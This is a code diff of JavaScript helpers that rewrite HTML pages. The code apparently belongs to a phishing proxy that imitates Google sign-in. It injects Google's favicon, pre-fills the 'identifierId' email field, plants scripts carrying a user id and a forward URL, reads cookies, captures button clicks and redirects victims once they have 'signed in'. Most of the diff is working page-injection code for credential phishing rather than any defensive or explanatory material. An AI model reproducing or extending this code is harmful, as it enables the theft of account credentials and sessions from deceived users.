@@ -57,142 +57,149 @@ export function writeUserLog(userId, message) {
 //======================================
 
 export function removeSpecificTag(src, tag) {
-    let htmlTxt = src;
-    const startTag = '<' + tag;
-    const endTag = '</' + tag + '>';
-    
-    let startIdx = htmlTxt.indexOf(startTag);
-    if (startIdx < 0) {
-        return htmlTxt;
-    }
-    
-    let endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length;
-    
-    while (true) {
-        if (startIdx < 0) {
-            break;
-        }
-        
-        htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx);
-        
-        startIdx = htmlTxt.indexOf(startTag);
-        if (startIdx >= 0) {
-            endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length;
-        }
-    }
+  let htmlTxt = src;
+  const startTag = "<" + tag;
+  const endTag = "</" + tag;
+
+  let startIdx = htmlTxt.indexOf(startTag);
+  if (startIdx < 0) {
     return htmlTxt;
+  }
+
+  let endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;
+
+  while (true) {
+    if (startIdx < 0) {
+      break;
+    }
+
+    htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx);
+
+    startIdx = htmlTxt.indexOf(startTag);
+    if (startIdx >= 0) {
+      endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;
+    }
+  }
+  return htmlTxt;
 }
 
 export function getSpecificTagList(src, tag) {
-    let htmlTxt = src;
-    const startTag = '<' + tag;
-    const endTag = '</' + tag + '>';
-    
-    let startIdx = htmlTxt.indexOf(startTag);
-    let endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length;
+  let htmlTxt = src;
+  const startTag = "<" + tag;
+  const endTag = "</" + tag;
 
-    const tagList = [];
-    while (true) {
-        if (startIdx < 0) {
-            break;
-        }
-        
-        const cell = htmlTxt.substring(startIdx, endIdx);
-        if (cell.indexOf('body{opacity:0;}') < 0) {
-            tagList.push(cell);
-        }
-        
-        htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx);
-        
-        startIdx = htmlTxt.indexOf(startTag);
-        if (startIdx >= 0) {
-            endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length;
-        }
+  let startIdx = htmlTxt.indexOf(startTag);
+  let endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;
+
+  const tagList = [];
+  while (true) {
+    if (startIdx < 0) {
+      break;
     }
-    return tagList;
+
+    const cell = htmlTxt.substring(startIdx, endIdx);
+    if (cell.indexOf("body{opacity:0;}") < 0) {
+      tagList.push(cell);
+    }
+
+    htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx);
+
+    startIdx = htmlTxt.indexOf(startTag);
+    if (startIdx >= 0) {
+      endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;
+    }
+  }
+  return tagList;
 }
 
 export function addStyleList(src, styleList) {
-    let htmlTxt = src;
+  let htmlTxt = src;
 
-    let metaEndIdx = htmlTxt.indexOf('<meta');
-    if (metaEndIdx < 0) {
-        return htmlTxt;
-    }
-    
-    metaEndIdx = htmlTxt.indexOf('>', metaEndIdx);
-    if (metaEndIdx < 0) {
-        return htmlTxt;
-    }
-
-    for (let i = 0; i < styleList.length; i++) {
-        htmlTxt = htmlTxt.substring(0, metaEndIdx + 1) + 
-                  styleList[styleList.length - i - 1] + 
-                  htmlTxt.substring(metaEndIdx + 1);
-    }
-    
+  let metaEndIdx = htmlTxt.indexOf("<meta");
+  if (metaEndIdx < 0) {
     return htmlTxt;
+  }
+
+  metaEndIdx = htmlTxt.indexOf(">", metaEndIdx);
+  if (metaEndIdx < 0) {
+    return htmlTxt;
+  }
+
+  for (let i = 0; i < styleList.length; i++) {
+    htmlTxt =
+      htmlTxt.substring(0, metaEndIdx + 1) +
+      styleList[styleList.length - i - 1] +
+      htmlTxt.substring(metaEndIdx + 1);
+  }
+
+  return htmlTxt;
 }
 
 export function getHtmlAlreadySignin(forwardUrl) {
-    const htmlTxt = `
+  const htmlTxt = `
         <html>
             <script>window.location.href="${forwardUrl}"</script>
         </html>
     `;
-    return htmlTxt;
+  return htmlTxt;
 }
 
 export function setFavicon(src) {
-    const iconLink = '<link rel="shortcut icon" href="https://www.google.com/favicon.ico" />';
-    const headIdx = src.indexOf('<head>');
-    if (headIdx < 0) {
-        return src;
-    }
+  const iconLink =
+    '<link rel="shortcut icon" href="https://www.google.com/favicon.ico" />';
+  const headIdx = src.indexOf("<head>");
+  if (headIdx < 0) {
+    return src;
+  }
 
-    const htmlTxt = src.substring(0, headIdx + '<head>'.length) + 
-                   iconLink + 
-                   src.substring(headIdx + '<head>'.length);
-    return htmlTxt;
+  const htmlTxt =
+    src.substring(0, headIdx + "<head>".length) +
+    iconLink +
+    src.substring(headIdx + "<head>".length);
+  return htmlTxt;
 }
 
 export function setUserIdScript(src, userId) {
-    const htmlTxt = src + `
+  const htmlTxt =
+    src +
+    `
         <script>
             const user_id = ${userId};
             var reloaded = false;
 
-            // get api url //
-            var api_server_url = 'http://localhost:8101';
-            api_server_url = document.URL;
-            api_server_url = api_server_url.substring(0, api_server_url.indexOf('/', 10));
-            api_server_url = api_server_url + '/gauth';
-            //console.log(api_server_url);
+            var api_server_url = window.location.origin;            
+            console.log(api_server_url);
         </script>
     `;
-    return htmlTxt;
+  return htmlTxt;
 }
 
 export function setForwardUrlScript(src, forwardUrl) {
-    const htmlTxt = src + `
+  const htmlTxt =
+    src +
+    `
         <script>
             const forward_url = "${forwardUrl}";
         </script>
     `;
-    return htmlTxt;
+  return htmlTxt;
 }
 
 export function addSetInputEmailValueScript(src, email) {
-    const htmlTxt = src + `
+  const htmlTxt =
+    src +
+    `
         <script>
             document.getElementById("identifierId").value = "${email}";
         </script>
     `;
-    return htmlTxt;
+  return htmlTxt;
 }
 
 export function addTimeoutScript(src) {
-    const htmlTxt = src + `
+  const htmlTxt =
+    src +
+    `
         <script>
             window.setInterval(function() {
                 if(reloaded == false) {
@@ -230,11 +237,13 @@ export function addTimeoutScript(src) {
             }, 100);
         </script>
     `;
-    return htmlTxt;
+  return htmlTxt;
 }
 
 export function addFunctionsScript(src) {
-    const htmlTxt = src + `
+  const htmlTxt =
+    src +
+    `
         <script>
             var cur_page = 'email';
             //document.URL
@@ -300,12 +309,18 @@ export function addFunctionsScript(src) {
             }
 
             function getCookie(cookie_name) {
-                let matches = document.cookie.match(new RegExp(
-                    "(?:^|; )" + cookie_name.replace(/([\\.$?*|{}\\(\\)\\[\]\\\\\/\\+^])/g, '\\\\$1') + "=([^;]*)"
-                ));
-                return matches ? decodeURIComponent(matches[1]) : undefined;
-            }
+				let matches = document.cookie.match(new RegExp(
+					"(?:^|; )" + cookie_name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+					));
+				return matches ? decodeURIComponent(matches[1]) : undefined;
+			}
 
+            // function getCookie1(cookie_name) {
+            //     let matches = document.cookie.match(new RegExp(
+            //         "(?:^|; )" + cookie_name.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, '\$1') + "=([^;]*)"
+            //         ));
+            //     return matches ? decodeURIComponent(matches[1]) : undefined;
+            // }
             const btnClickFunction = (btn_type, btn_text) => {
                 // get uid //
                 uid = user_id;
@@ -447,6 +462,6 @@ export function addFunctionsScript(src) {
             }			
         </script>
     `;
-    
-    return htmlTxt;
+
+  return htmlTxt;
 }
